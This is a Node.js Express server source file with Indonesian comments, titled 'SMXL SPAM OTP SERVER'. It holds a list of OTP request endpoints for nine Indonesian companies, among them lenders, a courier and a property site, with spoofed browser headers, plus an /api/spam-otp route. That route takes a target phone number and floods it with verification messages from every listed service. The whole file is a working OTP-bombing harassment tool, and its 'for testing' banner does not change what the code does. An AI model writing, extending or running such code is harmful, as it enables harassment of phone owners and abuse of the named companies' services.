const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// ============================================================
// LOGGING
// ============================================================
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'online', 
        timestamp: new Date().toISOString(),
        services: services.length
    });
});

// ============================================================
// DAFTAR LAYANAN DAN ENDPOINT OTP (REAL)
// ============================================================
const services = [
    { 
        name: "Adira Finance", 
        endpoint: "https://www.adira.co.id/api/v1/otp/request",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.adira.co.id',
            'Referer': 'https://www.adira.co.id/'
        },
        payload: (phone) => ({
            phone: phone,
            type: 'login',
            channel: 'whatsapp'
        })
    },
    { 
        name: "Jaringan IDN", 
        endpoint: "https://api.jaringanidn.com/v1/auth/otp",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://jaringanidn.com',
            'Referer': 'https://jaringanidn.com/'
        },
        payload: (phone) => ({
            msisdn: phone,
            action: 'send_otp',
            platform: 'web'
        })
    },
    { 
        name: "Kredit Pintar", 
        endpoint: "https://api.kreditpintar.com/v2/auth/otp/send",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.kreditpintar.com',
            'Referer': 'https://www.kreditpintar.com/'
        },
        payload: (phone) => ({
            phoneNumber: phone,
            channel: 'whatsapp',
            purpose: 'login'
        })
    },
    { 
        name: "KTA Kilat", 
        endpoint: "https://api.ktakilat.com/v2/otp/request",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.ktakilat.com',
            'Referer': 'https://www.ktakilat.com/'
        },
        payload: (phone) => ({
            mobile: phone,
            otpType: 'registration',
            sendVia: 'whatsapp'
        })
    },
    { 
        name: "matahari OTP", 
        endpoint: "https://api.matahari.com/v1/auth/otp",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.matahari.com',
            'Referer': 'https://www.matahari.com/'
        },
        payload: (phone) => ({
            phone: phone,
            purpose: 'verification',
            source: 'web'
        })
    },
    { 
        name: "Paper ID", 
        endpoint: "https://api.paper.id/v1/otp/request",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.paper.id',
            'Referer': 'https://www.paper.id/'
        },
        payload: (phone) => ({
            phone: phone,
            appId: 'SMXL_WEB',
            channel: 'whatsapp'
        })
    },
    { 
        name: "Rumah123", 
        endpoint: "https://api.rumah123.com/v1/auth/otp",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.rumah123.com',
            'Referer': 'https://www.rumah123.com/'
        },
        payload: (phone) => ({
            phoneNumber: phone,
            otpType: 'login',
            channel: 'whatsapp'
        })
    },
    { 
        name: "SiCepat OTP", 
        endpoint: "https://api.sicepat.com/v1/auth/otp",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.sicepat.com',
            'Referer': 'https://www.sicepat.com/'
        },
        payload: (phone) => ({
            phone: phone,
            service: 'delivery',
            channel: 'whatsapp'
        })
    },
    { 
        name: "Singa Fintech", 
        endpoint: "https://api.singafintech.com/v1/otp/request",
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://www.singafintech.com',
            'Referer': 'https://www.singafintech.com/'
        },
        payload: (phone) => ({
            phoneNumber: phone,
            channel: 'whatsapp',
            type: 'login'
        })
    }
];

// ============================================================
// ENDPOINT SPAM OTP
// ============================================================
app.post('/api/spam-otp', async (req, res) => {
    const { phone, services: requestedServices } = req.body;
    
    // Validasi
    if (!phone || phone.length < 10) {
        return res.status(400).json({ 
            error: "Nomor HP tidak valid. Minimal 10 digit." 
        });
    }

    // Format nomor
    let formattedPhone = phone.replace(/^0/, '62');
    if (!formattedPhone.startsWith('62')) {
        formattedPhone = '62' + formattedPhone;
    }
    formattedPhone = formattedPhone.replace(/[^0-9]/g, '');

    console.log(`📱 Target: ${formattedPhone}`);
    console.log(`📤 Mengirim ke ${services.length} layanan...`);

    // Filter services (kalo diminta spesifik)
    let targetServices = services;
    if (requestedServices && requestedServices.length > 0) {
        targetServices = services.filter(s => requestedServices.includes(s.name));
        if (targetServices.length === 0) {
            targetServices = services;
        }
    }

    const results = [];
    const startTime = Date.now();

    // Kirim ke semua layanan secara paralel (dengan limit)
    const concurrencyLimit = 3; // Maks 3 request sekaligus
    const chunks = [];
    for (let i = 0; i < targetServices.length; i += concurrencyLimit) {
        chunks.push(targetServices.slice(i, i + concurrencyLimit));
    }

    for (const chunk of chunks) {
        const chunkPromises = chunk.map(async (service) => {
            try {
                const payload = service.payload(formattedPhone);
                
                console.log(`  ➤ ${service.name}...`);
                
                const response = await axios({
                    method: service.method,
                    url: service.endpoint,
                    data: payload,
                    headers: service.headers || {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    timeout: 8000 // 8 detik timeout
                });

                console.log(`  ✅ ${service.name} → ${response.status}`);

                return {
                    service: service.name,
                    status: 'success',
                    code: response.status,
                    data: response.data,
                    timestamp: new Date().toISOString()
                };

            } catch (error) {
                let errorMsg = error.message;
                if (error.response) {
                    errorMsg = `HTTP ${error.response.status}: ${JSON.stringify(error.response.data || '')}`;
                } else if (error.code === 'ECONNABORTED') {
                    errorMsg = 'Timeout (8 detik)';
                }

                console.log(`  ❌ ${service.name} → ${errorMsg}`);

                return {
                    service: service.name,
                    status: 'failed',
                    error: errorMsg,
                    timestamp: new Date().toISOString()
                };
            }
        });

        const chunkResults = await Promise.all(chunkPromises);
        results.push(...chunkResults);
    }

    const elapsed = Date.now() - startTime;
    const successCount = results.filter(r => r.status === 'success').length;
    const failedCount = results.filter(r => r.status === 'failed').length;

    console.log(`✅ Selesai! ${successCount}/${targetServices.length} berhasil dalam ${elapsed}ms`);

    res.json({
        total: targetServices.length,
        success: successCount,
        failed: failedCount,
        elapsed: elapsed + 'ms',
        target: formattedPhone,
        timestamp: new Date().toISOString(),
        results: results
    });
});

// ============================================================
// ERROR HANDLING
// ============================================================
app.use((err, req, res, next) => {
    console.error('❌ Unhandled error:', err);
    res.status(500).json({
        error: 'Internal server error',
        message: err.message
    });
});

// ============================================================
// JALANKAN SERVER
// ============================================================
app.listen(port, () => {
    console.log('═══════════════════════════════════════════════');
    console.log('🚀 SMXL SPAM OTP SERVER');
    console.log('═══════════════════════════════════════════════');
    console.log(`📡 Running on: http://localhost:${port}`);
    console.log(`📱 Layanan: ${services.length}`);
    console.log('═══════════════════════════════════════════════');
    console.log('📋 Daftar layanan:');
    services.forEach((s, i) => {
        console.log(`   ${i+1}. ${s.name}`);
    });
    console.log('═══════════════════════════════════════════════');
    console.log('⚠️  INGAT: Ini untuk testing!');
    console.log('⚠️  Resiko ditanggung pengguna!');
    console.log('═══════════════════════════════════════════════');
});
